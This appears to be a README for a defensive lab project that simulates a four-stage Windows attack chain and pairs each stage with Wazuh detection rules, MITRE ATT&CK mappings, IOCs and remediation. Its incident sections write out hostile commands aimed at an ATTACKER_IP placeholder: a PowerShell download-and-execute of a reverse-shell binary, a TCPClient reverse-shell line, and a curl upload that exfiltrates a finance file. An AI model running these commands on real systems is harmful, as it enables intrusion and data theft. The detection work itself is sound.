# Cyber Security Incident Playbook — Full Attack Chain Lab

A full end-to-end attack simulation covering Initial Access through Data Exfiltration, with detection rules built in Wazuh and mapped to the MITRE ATT&CK framework. Incident response and detection engineering lab project

---

## Attack Chain Overview

| # | Phase | Technique | MITRE ID |
|---|-------|-----------|----------|
| 1 | Initial Access | Spearphishing Attachment via malicious LNK shortcut | [T1566.001](https://attack.mitre.org/techniques/T1566/001/) |
| 2 | Privilege Escalation | Insecure Scheduled Task permissions → SYSTEM shell | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) |
| 3 | Persistence | Permanent WMI Event Subscription (timer-based) | [T1546.003](https://attack.mitre.org/techniques/T1546/003/) |
| 4 | Exfiltration | Data exfil over C2 channel via curl to Python upload server | [T1041](https://attack.mitre.org/techniques/T1041/) |

> All activities were performed in an isolated lab environment (Windows 11 VM + Kali Linux VM on a host-only network). No real systems were targeted.

---

## Lab Environment

| Role | OS | Notes |
|------|----|-------|
| Attacker | Kali Linux | Hosts netcat listeners, Python upload server, payload HTTP server |
| Victim | Windows 11 | Sysmon + Wazuh agent installed, PowerShell logging enabled |
| SIEM | Wazuh | Receives Sysmon + Windows Event logs from victim VM |

---

## Incident Summaries

### Incident #001 — Spearphishing Attachment (LNK) `T1566.001`

A malicious `.LNK` shortcut disguised as `notepad.exe` was delivered via phishing email. When clicked, it triggered:

```
cmd.exe /c powershell.exe wget http://<ATTACKER_IP>/8443.exe -OutFile C:\icrm\8443.exe && C:\icrm\8443.exe
```

This downloaded and executed a reverse shell payload (port 8443), connecting back to the attacker's netcat listener. The payload was deleted post-execution as an anti-forensic measure (`T1070.004`).

**Detection:** Wazuh rule 100001 — flags PowerShell downloading and executing an EXE spawned from `cmd.exe`.

---

### Incident #002 — Privilege Escalation via Insecure Scheduled Task `T1053.005`

A scheduled task (`CleanupTask`) was found running `C:\TaskScripts\cleanup.ps1` as `SYSTEM`. The file had `FullControl` permissions for `Authenticated Users`, meaning any standard user could overwrite it.

The script was replaced with a PowerShell reverse shell payload:

```powershell
$c = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>", 4444)
```

When the task next fired, a SYSTEM-level shell was returned to the attacker's listener.

**Detection:** Wazuh + PowerShell Script Block Logging (Event ID 4104) — captured the full reverse shell payload including `TCPClient` and `Invoke-Expression` calls. File Integrity Monitoring on `C:\TaskScripts\` flagged the script modification.

---

### Incident #003 — WMI Event Subscription Persistence `T1546.003`

A permanent WMI event subscription was created using three components in `root\subscription`:

- `__EventFilter` — WQL timer trigger (every 60 seconds)
- `CommandLineEventConsumer` — executes a hidden, Base64-encoded PowerShell payload
- `__FilterToConsumerBinding` — binds the two together

The payload used stealth flags: `-WindowStyle Hidden -ExecutionPolicy Bypass -enc`. Persistence survives reboots.

**Detection:** Wazuh detected `powershell.exe` launched by WMI with Base64-encoded command line. Sysmon Event IDs 19/20/21 capture WMI filter/consumer/binding creation directly.

---

### Incident #004 — Exfiltration Over C2 Channel `T1041`

With SYSTEM-level access from Incident #002, `finance-data.txt` was exfiltrated using `curl.exe` over HTTP POST to a Python `uploadserver` running on the attacker machine (port 8000):

```powershell
$output = (C:\Windows\System32\curl.exe -F "files=@C:\icrm\finance-data.txt" http://<ATTACKER_IP>:8000/upload 2>&1 | Out-String)
```

**Detection:** Wazuh rule 300004 — flags `curl.exe` process creation with upload-related arguments (`-F`, `--form`, `--upload-file`) over HTTP/S.

---

## MITRE ATT&CK Navigator

Load `attack_navigator_layer.json` into [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) to view the full technique map with annotations.

Supporting techniques observed across incidents:

- `T1204.002` — User Execution: Malicious File
- `T1059.001` — PowerShell
- `T1059.003` — Windows Command Shell
- `T1105` — Ingress Tool Transfer
- `T1070.004` — File Deletion

---

## Wazuh Detection Rules

Custom rules are in `rules/custom_wazuh_rules.xml`. To deploy:

1. Copy to `/var/ossec/etc/rules/` on your Wazuh manager
2. Restart Wazuh: `systemctl restart wazuh-manager`
3. Requires Sysmon on the Windows endpoint with logs forwarded to Wazuh

**Prerequisites:**
- Sysmon installed on Windows endpoint (rule `if_sid 61603` = Sysmon process creation)
- PowerShell Script Block Logging enabled via Group Policy (Event ID 4104)
- Wazuh File Integrity Monitoring configured on sensitive directories

---

## Repository Structure

```
.
├── README.md
├── attack_navigator_layer.json    # Load into ATT&CK Navigator
├── rules/
│   └── custom_wazuh_rules.xml    # Wazuh detection rules (T1566.001, T1041)
├── docs/
│   └── Incident_Playbook.docx    # Full report with screenshots and IOCs
└── screenshots/                   # Place exported screenshots here
```

---

## Key Indicators of Compromise (IOCs)

| Type | Indicator | Incident |
|------|-----------|----------|
| File | `C:\icrm\notepad.exe` — LNK shortcut masquerading as Notepad | #001 |
| File | `C:\icrm\8443.exe` — reverse shell payload (may be deleted post-exec) | #001 |
| File | `C:\TaskScripts\cleanup.ps1` — writable by Authenticated Users | #002 |
| Process chain | `explorer.exe → cmd.exe → powershell.exe → 8443.exe` | #001 |
| Process chain | `svchost.exe (Task Scheduler) → powershell.exe → network connection` | #002 |
| WMI object | `__EventFilter: DemoSystemUpdateFilter` in `root\subscription` | #003 |
| WMI object | `CommandLineEventConsumer: DemoSystemUpdateConsumer` | #003 |
| PowerShell flags | `-WindowStyle Hidden -ExecutionPolicy Bypass -enc` | #003 |
| Network | Outbound TCP on port 8443 to unknown external IP | #001 |
| Network | Outbound TCP on port 4444 to unknown external IP | #002 |
| Network | HTTP POST to unknown IP on port 8000 with file attachment | #004 |

---

## Remediation Highlights

- **Block `.LNK` email attachments** at the mail gateway
- **Audit scheduled task permissions** — scripts should not be writable by standard users
- **Query `root\subscription`** regularly for unknown WMI filters/consumers
- **Egress filtering** — block outbound on non-standard ports (4444, 8443, 8000)
- **PowerShell hardening** — Script Block Logging (Event ID 4104), Constrained Language Mode
- **Application control** — WDAC/AppLocker to restrict execution from non-standard paths

---

## References

| Technique | Reference |
|-----------|-----------|
| T1566.001 | https://attack.mitre.org/techniques/T1566/001/ |
| T1053.005 | https://attack.mitre.org/techniques/T1053/005/ |
| T1546.003 | https://attack.mitre.org/techniques/T1546/003/ |
| T1041 | https://attack.mitre.org/techniques/T1041/ |
| Wazuh Docs | https://documentation.wazuh.com/current/user-manual/capabilities/log-data-collection/how-it-works.html |
| Sysmon | https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon |
| WMI SDK | https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page |
